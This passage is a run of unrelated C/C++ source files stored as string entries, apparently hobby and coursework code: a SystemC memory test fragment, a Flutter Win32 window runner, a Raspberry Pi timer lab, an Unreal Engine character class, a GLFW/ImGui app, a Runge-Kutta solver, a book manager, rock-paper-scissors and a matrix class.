);\r\n\r\n\t\tmemWriterReaderSocket->b_transport( *blockWriteRead, blockedTime ); \r\n\t\t\r\n\t\tif ( blockWriteRead->is_response_error() )\r\n\t\t\tSC_REPORT_ERROR(\"TLM-2\", \"Error in memory handling of b_transport\");\r\n\r\n\t\tcout << \" At time: \" << sc_time_stamp() << \"WR: \" \r\n\t\t\t << (cmd ? 'W' : 'R') << \", Iteration:\" << i << \" data:\";\r\n\t\tsc_lv<8> vv; \r\n\t\tfor(int j=0; j<5; j++) {vv=data[j]; cout << vv << \" \";} cout << '\\n'; \r\n\t\t// wait(pauseTime);\r\n\t}\r\n}\r\n",
    "#include \"win32_window.h\"\n\n#include <dwmapi.h>\n#include <flutter_windows.h>\n\n#include \"resource.h\"\n\nnamespace {\n\n/// Window attribute that enables dark mode window decorations.\n///\n/// Redefined in case the developer's machine has a Windows SDK older than\n/// version 10.0.22000.0.\n/// See: https://docs.microsoft.com/windows/win32/api/dwmapi/ne-dwmapi-dwmwindowattribute\n#ifndef DWMWA_USE_IMMERSIVE_DARK_MODE\n#define DWMWA_USE_IMMERSIVE_DARK_MODE 20\n#endif\n\nconstexpr const wchar_t kWindowClassName[] = L\"FLUTTER_RUNNER_WIN32_WINDOW\";\n\n/// Registry key for app theme preference.\n///\n/// A value of 0 indicates apps should use dark mode. A non-zero or missing\n/// value indicates apps should use light mode.\nconstexpr const wchar_t kGetPreferredBrightnessRegKey[] =\n  L\"Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Themes\\\\Personalize\";\nconstexpr const wchar_t kGetPreferredBrightnessRegValue[] = L\"AppsUseLightTheme\";\n\n// The number of Win32Window objects that currently exist.\nstatic int g_active_window_count = 0;\n\nusing EnableNonClientDpiScaling = BOOL __stdcall(HWND hwnd);\n\n// Scale helper to convert logical scaler values to physical using passed in\n// scale factor\nint Scale(int source, double scale_factor) {\n  return static_cast<int>(source * scale_factor);\n}\n\n// Dynamically loads the |EnableNonClientDpiScaling| from the User32 module.\n// This API is only needed for PerMonitor V1 awareness mode.\nvoid EnableFullDpiSupportIfAvailable(HWND hwnd) {\n  HMODULE user32_module = LoadLibraryA(\"User32.dll\");\n  if (!user32_module) {\n    return;\n  }\n  auto enable_non_client_dpi_scaling =\n      reinterpret_cast<EnableNonClientDpiScaling*>(\n          GetProcAddress(user32_module, \"EnableNonClientDpiScaling\"));\n  if (enable_non_client_dpi_scaling != nullptr) {\n    enable_non_client_dpi_scaling(hwnd);\n  }\n  FreeLibrary(user32_module);\n}\n\n}  // namespace\n\n// Manages the Win32Window's window class registration.\nclass WindowClassRegistrar {\n public:\n  ~WindowClassRegistrar() = default;\n\n  // Returns the singleton registrar instance.\n  static WindowClassRegistrar* GetInstance() {\n    if (!instance_) {\n      instance_ = new WindowClassRegistrar();\n    }\n    return instance_;\n  }\n\n  // Returns the name of the window class, registering the class if it hasn't\n  // previously been registered.\n  const wchar_t* GetWindowClass();\n\n  // Unregisters the window class. Should only be called if there are no\n  // instances of the window.\n  void UnregisterWindowClass();\n\n private:\n  WindowClassRegistrar() = default;\n\n  static WindowClassRegistrar* instance_;\n\n  bool class_registered_ = false;\n};\n\nWindowClassRegistrar* WindowClassRegistrar::instance_ = nullptr;\n\nconst wchar_t* WindowClassRegistrar::GetWindowClass() {\n  if (!class_registered_) {\n    WNDCLASS window_class{};\n    window_class.hCursor = LoadCursor(nullptr, IDC_ARROW);\n    window_class.lpszClassName = kWindowClassName;\n    window_class.style = CS_HREDRAW | CS_VREDRAW;\n    window_class.cbClsExtra = 0;\n    window_class.cbWndExtra = 0;\n    window_class.hInstance = GetModuleHandle(nullptr);\n    window_class.hIcon =\n        LoadIcon(window_class.hInstance, MAKEINTRESOURCE(IDI_APP_ICON));\n    window_class.hbrBackground = 0;\n    window_class.lpszMenuName = nullptr;\n    window_class.lpfnWndProc = Win32Window::WndProc;\n    RegisterClass(&window_class);\n    class_registered_ = true;\n  }\n  return kWindowClassName;\n}\n\nvoid WindowClassRegistrar::UnregisterWindowClass() {\n  UnregisterClass(kWindowClassName, nullptr);\n  class_registered_ = false;\n}\n\nWin32Window::Win32Window() {\n  ++g_active_window_count;\n}\n\nWin32Window::~Win32Window() {\n  --g_active_window_count;\n  Destroy();\n}\n\nbool Win32Window::Create(const std::wstring& title,\n                         const Point& origin,\n                         const Size& size) {\n  Destroy();\n\n  const wchar_t* window_class =\n      WindowClassRegistrar::GetInstance()->GetWindowClass();\n\n  const POINT target_point = {static_cast<LONG>(origin.x),\n                              static_cast<LONG>(origin.y)};\n  HMONITOR monitor = MonitorFromPoint(target_point, MONITOR_DEFAULTTONEAREST);\n  UINT dpi = FlutterDesktopGetDpiForMonitor(monitor);\n  double scale_factor = dpi / 96.0;\n\n  HWND window = CreateWindow(\n      window_class, title.c_str(), WS_OVERLAPPEDWINDOW,\n      Scale(origin.x, scale_factor), Scale(origin.y, scale_factor),\n      Scale(size.width, scale_factor), Scale(size.height, scale_factor),\n      nullptr, nullptr, GetModuleHandle(nullptr), this);\n\n  if (!window) {\n    return false;\n  }\n\n  UpdateTheme(window);\n\n  return OnCreate();\n}\n\nbool Win32Window::Show() {\n  return ShowWindow(window_handle_, SW_SHOWNORMAL);\n}\n\n// static\nLRESULT CALLBACK Win32Window::WndProc(HWND const window,\n                                      UINT const message,\n                                      WPARAM const wparam,\n                                      LPARAM const lparam) noexcept {\n  if (message == WM_NCCREATE) {\n    auto window_struct = reinterpret_cast<CREATESTRUCT*>(lparam);\n    S",
    "// Lab 5, Exercise 2\n// g++ -std=c++14 Lab5EX2.cpp -o Lab5EX2 -lwiringPi\n\n#include <stdio.h>\n#include <wiringPi.h>\n#include <wiringPiI2C.h>\n#include <string.h>\n#include <chrono>\n#include <ratio>\n#include <ctime>\n#include <iostream>\n#include <sstream>\n#include <iomanip>\n#include <unistd.h>\n/* Complete the code: include the file lab_util.cpp  */\n//#include \"lab_util.cpp\"\n#include \"lab_util.cpp\"\nusing namespace std::chrono;\nusing namespace std;\n\n\n/* Complete the code: Set button pin */\nint BUTTON = 26;\n\nhigh_resolution_clock::time_point hit_time; \n\n// State enum definition\nenum State {\n\tSTOPPED,\n\tRUNNING,\n\tRESET\n};\n\n// Global variables\nState state;\nhigh_resolution_clock::time_point begin_time;\nunsigned int counter;\n\n/* Complete the code, implement the timer */\nvoid press_button() {\n    double sleep_duration = 0.1;\n    int reset_counter = 0;\n    int counter_max = 4 / sleep_duration;\n\n    if (state == STOPPED) {\n\n        /* Complete the code */\n        if (digitalRead(BUTTON)){\n           \n            state = RUNNING;\n            begin_time = high_resolution_clock::now();\n        }\n\n    } else if (state == RUNNING) {\n        /* Complete the code  */\n        if(digitalRead(BUTTON)){\n            \n            counter++;\n\n            hit_time = high_resolution_clock::now();\n\n            string timestamp = formatTime(begin_time, hit_time);\n\n            cout << counter << \" : \" << counter;\n\n            if(counter == 1 || counter == 21){\n               cout << \"st place: \";\n            }\n        \n            else if(counter == 2 || counter == 22){\n                cout << \"nd place: \";\n            }\n\n            else if(counter == 3 || counter == 23){\n                cout << \"rd place: \";\n            }\n\n            else{\n                cout << \"th place: \";\n            }\n\n            cout << \" place: \" << timestamp << endl;\n        }\n\n        while(digitalRead(BUTTON)){\n            usleep(sleep_duration*1000*1000);\n            reset_counter += 1;\n            if(reset_counter >= counter_max){\n                state = STOPPED;\n                counter = 0;\n                cout << \"Reset\" << endl;\n\n                break;\n            }\n        }\n\n    } \n}\n\n\nint main(){\n\n    // Set up WiringPi\n    if (wiringPiSetup() == -1) exit (1);\n\n    state = STOPPED;\n    counter = 0;\n    unsigned int button_time = 0;\n    \n\n    cout << \"Holding for long time to reset\" << endl;\n    \n    /* Complete the code to implement the timer  */\n    pinMode(BUTTON, INPUT);\n    \n    wiringPiISR(BUTTON, INT_EDGE_RISING, &press_button);\n\n\n    /*\n    Tips:\n    1) Set digital pins to input, Use pinMode(PIN, MODE)\n    2) Use wiringPiISR() to get the interupt\n    3) Read the state of pin: digitalRead(PIN)\n    4) Use delay() to set a delay\n    5) Define the state for the timer\n    6) Use the formatTime() in lab_util.cpp\n    */\n   while(true){}\n\n    return 0;\n}",
    "// Copyright Epic Games, Inc. All Rights Reserved.\r\n\r\n#include \"UERoadmapCharacter.h\"\r\n#include \"UERoadmapProjectile.h\"\r\n#include \"Animation/AnimInstance.h\"\r\n#include \"Camera/CameraComponent.h\"\r\n#include \"Components/CapsuleComponent.h\"\r\n#include \"Components/SkeletalMeshComponent.h\"\r\n#include \"EnhancedInputComponent.h\"\r\n#include \"EnhancedInputSubsystems.h\"\r\n#include \"InputActionValue.h\"\r\n#include \"UERoadmapHUD.h\"\r\n#include \"Engine/LocalPlayer.h\"\r\n#include \"Kismet/GameplayStatics.h\"\r\n\r\nDEFINE_LOG_CATEGORY(LogTemplateCharacter);\r\n\r\n//////////////////////////////////////////////////////////////////////////\r\n// AUERoadmapCharacter\r\n\r\nAUERoadmapCharacter::AUERoadmapCharacter()\r\n{\r\n\t// Set size for collision capsule\r\n\tGetCapsuleComponent()->InitCapsuleSize(55.f, 96.0f);\r\n\t\t\r\n\t// Create a CameraComponent\t\r\n\tFirstPersonCameraComponent = CreateDefaultSubobject<UCameraComponent>(TEXT(\"FirstPersonCamera\"));\r\n\tFirstPersonCameraComponent->SetupAttachment(GetCapsuleComponent());\r\n\tFirstPersonCameraComponent->SetRelativeLocation(FVector(-10.f, 0.f, 60.f)); // Position the camera\r\n\tFirstPersonCameraComponent->bUsePawnControlRotation = true;\r\n\r\n\t// Create a mesh component that will be used when being viewed from a '1st person' view (when controlling this pawn)\r\n\tMesh1P = CreateDefaultSubobject<USkeletalMeshComponent>(TEXT(\"CharacterMesh1P\"));\r\n\tMesh1P->SetOnlyOwnerSee(true);\r\n\tMesh1P->SetupAttachment(FirstPersonCameraComponent);\r\n\tMesh1P->bCastDynamicShadow = false;\r\n\tMesh1P->CastShadow = false;\r\n\t//Mesh1P->SetRelativeRotation(FRotator(0.9f, -19.19f, 5.2f));\r\n\tMesh1P->SetRelativeLocation(FVector(-30.f, 0.f, -150.f));\r\n\r\n}\r\n\r\nvoid AUERoadmapCharacter::BeginPlay()\r\n{\r\n\t// Call the base class  \r\n\tSuper::BeginPlay();\r\n}\r\n\r\n//////////////////////////////////////////////////////////////////////////// Input\r\n\r\nvoid AUERoadmapCharacter::SetupPlayerInputComponent(UInputComponent* PlayerInputComponent)\r\n{\t\r\n\t// Set up action bindings\r\n\tif (UEnhancedInputComponent* EnhancedInputComponent = Cast<UEnhancedInputComponent>(PlayerInputComponent))\r\n\t{\r\n\t\t// Jumping\r\n\t\tEnhancedInputComponent->BindAction(JumpAction, ETriggerEvent::Started, this, &ACharacter::Jump);\r\n\t\tEnhancedInputComponent->BindAction(JumpAction, ETriggerEvent::Completed, this, &ACharacter::StopJumping);\r\n\r\n\t\t// Moving\r\n\t\tEnhancedInputComponent->BindAction(MoveAction, ETriggerEvent::Triggered, this, &AUERoadmapCharacter::Move);\r\n\r\n\t\t// Looking\r\n\t\tEnhancedInputComponent->BindAction(LookAction, ETriggerEvent::Triggered, this, &AUERoadmapCharacter::Look);\r\n\t\t\r\n\t\t// Toggle Menu\r\n        EnhancedInputComponent->BindAction(ToggleMenuAction, ETriggerEvent::Triggered, this, &AUERoadmapCharacter::ToggleMenu);\r\n\t}\r\n\telse\r\n\t{\r\n\t\tUE_LOG(LogTemplateCharacter, Error, TEXT(\"'%s' Failed to find an Enhanced Input Component! This template is built to use the Enhanced Input system. If you intend to use the legacy system, then you will need to update this C++ file.\"), *GetNameSafe(this));\r\n\t}\r\n}\r\n\r\n\r\nbool AUERoadmapCharacter::OnFireTriggered()\r\n{\r\n\tbool bWasFired = false;\r\n\tif (AmmoCount > 0)\r\n\t{\r\n\t\tAmmoCount--;\r\n\t\tbWasFired = true;\r\n\t}\r\n\treturn bWasFired;\r\n}\r\n\r\nvoid AUERoadmapCharacter::Move(const FInputActionValue& Value)\r\n{\r\n\t// input is a Vector2D\r\n\tFVector2D MovementVector = Value.Get<FVector2D>();\r\n\r\n\tif (Controller != nullptr)\r\n\t{\r\n\t\t// add movement \r\n\t\tAddMovementInput(GetActorForwardVector(), MovementVector.Y);\r\n\t\tAddMovementInput(GetActorRightVector(), MovementVector.X);\r\n\t}\r\n}\r\n\r\nvoid AUERoadmapCharacter::Look(const FInputActionValue& Value)\r\n{\r\n\t// input is a Vector2D\r\n\tFVector2D LookAxisVector = Value.Get<FVector2D>();\r\n\r\n\tif (Controller != nullptr)\r\n\t{\r\n\t\t// add yaw and pitch input to controller\r\n\t\tAddControllerYawInput(LookAxisVector.X);\r\n\t\tAddControllerPitchInput(LookAxisVector.Y);\r\n\t}\r\n}\r\n\r\nvoid AUERoadmapCharacter::ToggleMenu(const FInputActionValue& Value)\r\n{\r\n\tAPlayerController* PC = UGameplayStatics::GetPlayerController(GetWorld(), 0);\r\n\tAUERoadmapHUD* HUD = PC->GetHUD<AUERoadmapHUD>();\r\n\r\n\tif (PC != nullptr && HUD != nullptr)\r\n\t{\r\n\t\tif (!bIsMenuToggled)\r\n\t\t{\r\n\t\t\tPC->SetInputMode(FInputModeUIOnly());\r\n\t\t\tPC->SetShowMouseCursor(true);\r\n\t\t\tHUD->ShowMainMenu();\r\n\t\t}\r\n\t\telse\r\n\t\t{\r\n\t\t\tPC->SetInputMode(FInputModeGameOnly());\r\n\t\t\tPC->SetShowMouseCursor(false);\r\n\t\t\tHUD->HideMainMenu();\r\n\t\t}\r\n\t}\r\n}\r\n",
    "/************************/\n/*    gl_app.cpp        */\n/*    Version 1.0       */\n/*     2022/06/24       */\n/************************/\n\n#include <cstdio>\n#include \"log/log.h\"\n#include \"dglutils.h\"\n#include \"gl_app.h\"\n#include \"imgui_impl_glfw.h\"\n#include \"imgui_impl_opengl3.h\"\n#include \"implot.h\"\n#include \"uibase.h\"\n\nstatic GLApp* getGLApp(GLFWwindow* pWin)\n{\n    return (GLApp*)glfwGetWindowUserPointer(pWin);\n}\n\nstatic void error_callback(int error, const char* description)\n{\n    fprintf(stderr, \"Glfw Error %d: %s\\n\", error, description);\n    LOGGER(logging::ERROR)\n        << std::string(\"Glfw Error :\").append(std::to_string(error)).append(\": \").append(description);\n}\n\nstatic void keyCallback(GLFWwindow* window, int key, int scancode, int action, int mods)\n{\n    if (ImGui::GetIO().WantCaptureKeyboard) return;\n\n    GLApp* w = getGLApp(window);\n    if (key == GLFW_KEY_PRINT_SCREEN && action == GLFW_PRESS)\n    {\n        if (scancode & GLFW_MOD_CONTROL) {} // CTRL+PrtScr -> request FileName\n        if (!scancode) {}                   // CTRL+PrtScr -> TimeBased FileName\n    }\n#if 0\n    else if(key >= GLFW_KEY_F1 && key <= GLFW_KEY_F12 && action == GLFW_PRESS)\n    {\n        w->GetEngineWnd()->onSpecialKeyDown(key, 0, 0);\n    }\n#endif\n    else if (action == GLFW_PRESS || action == GLFW_RELEASE)\n    {\n        w->GetEngineWnd()->onKeyPress(key == GLFW_KEY_ENTER ? 13 : key, action == GLFW_PRESS);\n    }\n    else if ((GLFW_MOD_CONTROL == mods) && ('I' == key))\n    {\n        LOGGER(logging::INFO) << \"CTRL i - Toggle imgui dialog\";\n        w->GetImguizmoDlg()->ToggleVisibility();\n    }\n    else if ((GLFW_MOD_CONTROL == mods) && ('Q' == key))\n    {\n        LOGGER(logging::INFO) << \"CTRL q - exit\";\n        w->SetWindowShouldClose(true);\n    }\n    else {}\n}\n\nstatic void mouseButtonCallback(GLFWwindow* window, int button, int action, int mods)\n{\n    double x, y;\n    (void)mods;\n    glfwGetCursorPos(window, &x, &y);\n\n    getGLApp(window)->GetEngineWnd()->onMouseButton(button, action == GLFW_PRESS, x, y);\n}\n\nstatic void scrollCallback(GLFWwindow* window, double x, double y)\n{\n    getGLApp(window)->GetEngineWnd()->onScroll(x, y);\n}\n\nstatic void windowSizeCallback(GLFWwindow* window, int width, int height)\n{\n    getGLApp(window)->GetEngineWnd()->onReshape(width, height);\n}\n\nstatic void cursorPosCallback(GLFWwindow* window, double x, double y)\n{\n    getGLApp(window)->GetEngineWnd()->onMotion(x, y);\n}\n\nGLApp::GLApp()\n{\n    moEngineWin = std::make_unique<GLWindow>();\n    moGizmoWin  = std::make_unique<ImguizmoDialog>();\n}\n\nGLApp::~GLApp()\n{\n    onExit();\n}\n\nvoid GLApp::onInit()\n{\n    // some day modify so that it uses loaded size (and pos ?)\n    frameInit(WIN_TITLE, DEF_WIDTH, DEF_HEIGHT);\n    imguiInit();\n    moEngineWin->onInit();\n    // moGizmoWin->SetVisibility(true);\n}\n\nvoid GLApp::frameInit(const char* pWinTitle, int winW, int winH)\n{\n    glfwSetErrorCallback(error_callback);\n    if (!glfwInit()) exit(EXIT_FAILURE);\n#if defined(__APPLE__)\n    glfwWindowHint(GLFW_CONTEXT_VERSION_MAJOR, 3);\n    glfwWindowHint(GLFW_CONTEXT_VERSION_MINOR, 2);\n    glfwWindowHint(GLFW_OPENGL_PROFILE, GLFW_OPENGL_CORE_PROFILE);\n    glfwWindowHint(GLFW_OPENGL_FORWARD_COMPAT, GL_TRUE);\n#else\n    glfwWindowHint(GLFW_CONTEXT_VERSION_MAJOR, 3);\n    glfwWindowHint(GLFW_CONTEXT_VERSION_MINOR, 0);\n#endif\n    glfwWindowHint(GLFW_SAMPLES, 8);\n\n    // determine content scale\n#if !defined(__APPLE__)\n    {\n        int monsN     = 0;\n        auto** ppMons = glfwGetMonitors(&monsN);\n        for (int i = 0; i < monsN; ++i)\n        {\n            float x{};\n            float y{};\n            glfwGetMonitorContentScale(ppMons[i], &x, &y);\n            // get the first available reasonable content scale\n            if (x > 0 && y > 0)\n            {\n                mContentScale = x;\n                break;\n            }\n        }\n    }\n#endif\n\n    // set the coneent scale to UI Base's global for easy sharing\n    UIB_ContentSca     = mContentScale;\n\n    const auto useWinW = (int)((float)winW * mContentScale);\n    const auto useWinH = (int)((float)winH * mContentScale);\n\n    mpGLFWWin          = glfwCreateWindow(useWinW, useWinH, pWinTitle, NULL, NULL);\n    if (!mpGLFWWin)\n    {\n        glfwTerminate();\n        exit(EXIT_FAILURE);\n    }\n    glfwMakeContextCurrent(mpGLFWWin);\n    glfwSetWindowUserPointer(mpGLFWWin, (void*)this);\n    glfwSetKeyCallback(mpGLFWWin, keyCallback);\n    glfwSetMouseButtonCallback(mpGLFWWin, mouseButtonCallback);\n    glfwSetScrollCallback(mpGLFWWin, scrollCallback);\n    glfwSetWindowSizeCallback(mpGLFWWin, windowSizeCallback);\n    glfwSetCursorPosCallback(mpGLFWWin, cursorPosCallback);\n\n    // manually call it once to have the size set\n    windowSizeCallback(mpGLFWWin, useWinW, useWinH);\n\n    glfwSwapInterval(1);\n\n    if (glewInit() != GLEW_OK)\n    {\n        fprintf(stderr, \"Glew Error.\\n\");\n        LOGGER(logging::ERROR) << std::string(\"Glew Error.\");\n    }\n\n    // start intercepting and reporting GL errors without explicit checks\n    // ...proba",
    "#include \"runge.h\"\n\nstd::pair<std::vector<double>, std::vector<double>>\nRunge::solve(\n    std::function<double(double, double)> func,\n        double y0,\n        double x0,\n        double h,\n        std::size_t n\n) {\n\n    std::vector<double> y(n);\n    std::vector<double> x(n);\n\n    double k1 = 0., k2 = 0., k3 = 0., k4 = 0.;\n    double half_h = h / 2.;\n    double d_y = 0.;\n    y[0] = y0;\n    x[0] = x0;\n    \n    for (std::size_t i = 1; i < n; ++i)\n    {\n        k1 = func(x[i-1], y[i-1]);\n        k2 = func(x[i-1] + half_h, y[i-1] + half_h * k1);\n        k3 = func(x[i-1] + half_h, y[i-1] + half_h * k2);\n        k4 = func(x[i-1] + h, y[i-1] + h * k3);\n        y[i] = y[i-1] + h * (k1 + 2 * k2 + 2 * k3 + k4) / 6.;\n        x[i] = x[i-1] + h;\n    }\n\n    return std::pair{x, y};\n};\n\nstd::pair<std::vector<double>, std::vector<double>>\nRunge::solve(\n    std::function<double(double, double, double)> func,\n        double y0,\n        double dy0,\n        double x0,\n        double h,\n        std::size_t n\n) {\n\n    std::vector<double> y(n);\n    std::vector<double> x(n);\n\n    double k1 = 0., k2 = 0., k3 = 0., k4 = 0.;\n    double half_h = h / 2.;\n    double d_y = 0.;\n    y[0] = y0;\n    x[0] = x0;\n    \n    for (std::size_t i = 1; i < n; ++i)\n    {\n        k1 = h * func(x[i-1], y[i-1], dy0);\n        k2 = h * func(\n            x[i-1] + half_h,\n            y[i-1] + half_h * dy0 + (h / 8.) * k1,\n            dy0 + k1 / 2.);\n        k3 = h * func(\n            x[i-1] + half_h,\n            y[i-1] + half_h * dy0 + h / 8. * k1,\n            dy0 * k2 / 2.);\n        k4 = h * func(\n            x[i-1] + h,\n            y[i-1] + h * dy0 + half_h * k3,\n            dy0 * k3);\n        y[i] = y[i-1] + h * (dy0 + (k1 + k2 + k3) / 6.);\n        dy0 += (k1 + 2 * (k2 + k3) + k4) / 6.;\n        x[i] = x[i-1] + h;\n    }\n\n    return std::pair{x, y};\n}",
    "// Library Book Manager\n// Nicholas Hansen\n\n#include <iostream>\n#include <conio.h>\n\nusing namespace std;\n\nstruct Book{\n\tstring title;\n\tstring author;\n\tint yearPublished;\n\tint numPages;\n};\n\nint main() {\n\tconst int numBooks = 4;\n\tBook hobbit = { \"The Hobbit\", \"J.R.R. Tolkien\", 1937, 346 };\n\n\t// To Kill a Mockingbird release year: 1960\n\tBook mockingbird = { \"To Kill a Mockingbird\", \"Harper Lee\", NULL, 281 };\n\n\t// Frankenstein author: Mary Shelley\n\t// Frankenstein release year: 1818\n\tBook frankenstein = { \"Frankenstein\", \"Victor Frankenstein\", 1931, 280 };\n\n\t// Crime and Punishment page count: 527\n\tBook crime = { \"Crime and Punishment\", \"Fyodor Dostoevsky\", 1866 };\n\n\tBook books[numBooks] = { hobbit, mockingbird, frankenstein, crime };\n\n\tfor (int i = 0; i < numBooks; i++) {\n\t\tcout << books[i].title << \" written by \" << books[i].author << \" in \" << books[i].yearPublished << \". Has \" << books[i].numPages << \" pages.\\n\\n\";\n\t}\n\n\tint bookID = 0;\n\t//Checks to see if the user would like to quit\n\twhile (true) {\n\t\tcout << \"Enter Book ID to modify (0-3) [-1 to quit]: \";\n\t\tcin >> bookID;\n\t\tif (bookID == -1) {\n\t\t\tbreak;\n\t\t}\n\n\t\t//checks to see if the bookID is valid\n\t\twhile (!(bookID >= 0 && bookID < numBooks)) {\n\t\t\tcout << \"Enter a valid Book ID (0-3): \";\n\t\t\tcin >> bookID;\n\t\t}\n\n\t\t// instanciating variables to be used later\n\t\tstring title = books[bookID].title;\n\t\tstring author = books[bookID].author;\n\t\tint yearPublished = books[bookID].yearPublished;\n\t\tint pageCount = books[bookID].numPages;\n\t\tbool complete = true;\n\t\tchar check;\n\t\tint input = -1;\n\n\t\twhile (complete) {\n\t\t\t// Asks user for input on what they would like to change\n\t\t\tcout << \"What would you like to change?\\n[0] for Title\\n[1] for Author\\n[2] for Year Published\\n[3] for Page Count\\n[4] to quit\\n\";\n\t\t\tcin >> input;\n\t\t\t// Checks to see if the user input is a valid number\n\t\t\twhile (!(input >= 0 && input <= 4)) {\n\t\t\t\tcout << \"Enter a valid number.\\n[0] for Title\\n[1] for Author\\n[2] for Year Published\\n[3] for Page Count\\n[4] to quit\\n\";\n\t\t\t}\n\n\t\t\t// Checks to see if the user would like to quit\n\t\t\tif (input != 4) {\n\t\t\t\tdo {\n\t\t\t\t\t// Uses the input to determine what the user would like to change\n\t\t\t\t\tif (input == 0) {\n\t\t\t\t\t\tcout << \"What would you like to change the title to? \";\n\t\t\t\t\t\tcin >> title;\n\t\t\t\t\t}\n\t\t\t\t\telse if (input == 1) {\n\t\t\t\t\t\tcout << \"What would to like to change to author to? \";\n\t\t\t\t\t\tcin >> author;\n\t\t\t\t\t}\n\t\t\t\t\telse if (input == 2) {\n\t\t\t\t\t\tcout << \"What would you like to change the release year to? \";\n\t\t\t\t\t\tcin >> yearPublished;\n\t\t\t\t\t}\n\t\t\t\t\telse {\n\t\t\t\t\t\tcout << \"What would you like to change the page count to? \";\n\t\t\t\t\t\tcin >> pageCount;\n\t\t\t\t\t}\n\n\t\t\t\t\tinput = -1;\n\t\t\t\t\t// Asks the user if they would like to continue modifying\n\t\t\t\t\tcout << \"Would you like to make any more changes to this book? [y/n] \";\n\t\t\t\t\tcin >> check;\n\t\t\t\t\tif (check == 'n') {\n\t\t\t\t\t\tcomplete = false;\n\t\t\t\t\t}\n\t\t\t\t\telse {\n\t\t\t\t\t\tcout << \"What would you like to change?\\n[0] for Title\\n[1] for Author\\n[2] for Year Published\\n[3] for Page Count\\n[4] to quit\\n\";\n\t\t\t\t\t\tcin >> input;\n\t\t\t\t\t\t// Checks to see if the user input is a valid number\n\t\t\t\t\t\twhile (!(input >= 0 && input <= 4)) {\n\t\t\t\t\t\t\tcout << \"Enter a valid number.\\n[0] for Title\\n[1] for Author\\n[2] for Year Published\\n[3] for Page Count\\n[4] to quit\\n\";\n\t\t\t\t\t\t}\n\t\t\t\t\t}\n\n\t\t\t\t} while (complete);\n\n\n\t\t\t\tcout << \"Would you like to save the changes made? [y/n] \";\n\t\t\t\tcin >> check;\n\t\t\t\tif (check == 'y') {\n\t\t\t\t\tbooks[bookID].title = title;\n\t\t\t\t\tbooks[bookID].author = author;\n\t\t\t\t\tbooks[bookID].yearPublished = yearPublished;\n\t\t\t\t\tbooks[bookID].numPages = pageCount;\n\n\t\t\t\t\tcout << \"The following has been updated.\\n\";\n\t\t\t\t\tcout << books[bookID].title << \" written by \" << books[bookID].author << \" in \" << books[bookID].yearPublished << \". Has \" << books[bookID].numPages << \" pages.\\n\\n\";\n\t\t\t\t}\n\t\t\t}\n\t\t}\n\t}\n\n\t(void)_getch();\n\treturn 0;\n}",
    "#include <iostream>\n#include <cstdlib>\n#include <ctime>\n#include <cctype>\nusing namespace std;\n\n// returns either 'r', 'p', or 's' for rock, paper or scissors\nchar get_computers_choice() {\n\n    // generate random number based on time\n    srand(time(NULL));\n  \n    int random_number = (rand() % 3) + 1;\n    char computers_choice;\n\n    switch(random_number) {\n\n        case 1:\n            computers_choice = 'r';\n            break;\n\n        case 2:\n            computers_choice = 'p';\n            break;\n\n        case 3:\n            computers_choice = 's';\n            break;\n    }\n\n    return computers_choice;\n}\n\n// take user input and return it\n// function to get user input\nchar get_user_input() {\n\n    char user_input;\n\n    cout << \"Enter Your Choice (r for rock, p for paper, s for scissors): \";\n    cin >> user_input;\n  \n    user_input = tolower(user_input);\n\n    return user_input;\n}\n\n// return either 'w', 'l' or 'd' for win, loss and draw\nchar get_result(char user_pick, char computer_pick) {\n\n    // condition for user to draw\n    if (computer_pick == user_pick) {\n        return 'd';\n    }\n\n    // condition for user to win\n    else if (user_pick == 'p' && computer_pick == 'r') {\n        return 'w';\n    }\n    else if (user_pick == 'r' && computer_pick == 's') {\n        return 'w';\n    }\n    else if (user_pick == 's' && computer_pick == 'p') {\n        return 'w';\n    }\n\n    // all other conditions result in user losing\n    else {\n        return 'l';\n    }\n}\n\nint main() {\n\n    // get computer choice\n    char computer_pick = get_computers_choice();\n\n    // get input until user enters 'r', 'p' or 's'\n    char user_pick;\n    while (1) {\n        user_pick = get_user_input();\n        if (user_pick == 'r' || user_pick == 'p' || user_pick == 's') {\n            break;\n        }\n    }\n\n    char result = get_result(user_pick, computer_pick);\n\n    // print computer_pick and user_pick\n    cout << \"Computer's pick: \" << computer_pick << endl;\n    cout << \"Your pick: \" << user_pick << endl;\n\n    // print the result\n    switch(result) {\n\n        case 'w':            \n            cout << \"You won\" << endl;\n            break;\n\n        case 'l':\n            cout << \"You lost\" << endl;\n            break;\n\n        case 'd':\n            cout << \"Draw\" << endl;\n            break;\n    }\n\n    return 0;\n}",
    "//impporting libraries \n#include <stdio.h>\n#include <stdlib.h>\n#include <math.h>\n#include <limits.h>\n\n\n//matrix class \nclass matrix\n{\n\n    //creating variables to hold matrix rows, cols and elements \n    int num_rows;\n    int num_cols;\n    int *elements;\n\n//public functions \npublic:\n\n    //function to get the rows/cols of a matrix\n    int get_num_rows() { return num_rows; }\n    int get_num_cols() { return num_cols; }\n\n\n    //function to set the ij element of a matrix to value \n    void set_elem(int i, int j, int value){\n            elements[i * num_cols + j] = value;\n    }\n\n\n    //function to return the ij element of a matrix\n    int get_elem(int i, int j){\n            return elements[i * num_cols + j];\n    }\n\n\n    //matrix constructor \n    matrix(int nrow, int ncol){\n            num_rows = nrow;\n            num_cols = ncol;\n\n            printf(\"allocating memory for the matrix...\\n\");\n            elements = (int *)malloc(num_rows * num_cols * sizeof(int));\n    }\n\n\n    //matrix deconstructor \n    ~matrix()\n    {\n        printf(\"freeing the matrix...\\n\");\n        free(elements);\n    }\n\n\n    //function to print out elements of a matrix\n    void print()\n    {\n        for (int i = 0; i < num_rows; i++){\n            for (int j = 0; j < num_cols; j++){\n                printf(\"%d \", get_elem(i, j));\n            }\n            printf(\"\\n\");\n        }\n    }\n\n};\n\n\n\n\n\n\n//algorithm class\nclass algorithm{\n\n    matrix A;\n    \n\n    //public functions \n    public:\n\n        //algorithm constrictor takes row/col num and makes a matrix\n        algorithm(int num_rows, int num_cols): A(num_rows, num_cols){\n\n            //matrix is defined as an array first \n            double matrix_data[] = {0.0, 1.0, 1.0, 0.0, 0.0, 0.0, 0.0, \n                        0.0, 0.0, 1.0, 0.0, 0.0, 0.0, 0.0,\n                        0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0,\n                        0.0, 0.0, 1.0, 0.0, 1.0, 1.0, 0.0,\n                        1.0, 1.0, 1.0, 0.0, 0.0, 1.0, 0.0,\n                        1.0, 0.0, 1.0, 0.0, 0.0, 0.0, 0.0,\n                        1.0, 1.0, 1.0, 1.0, 1.0, 1.0, 0.0,};\n\n\n\n            //takes each 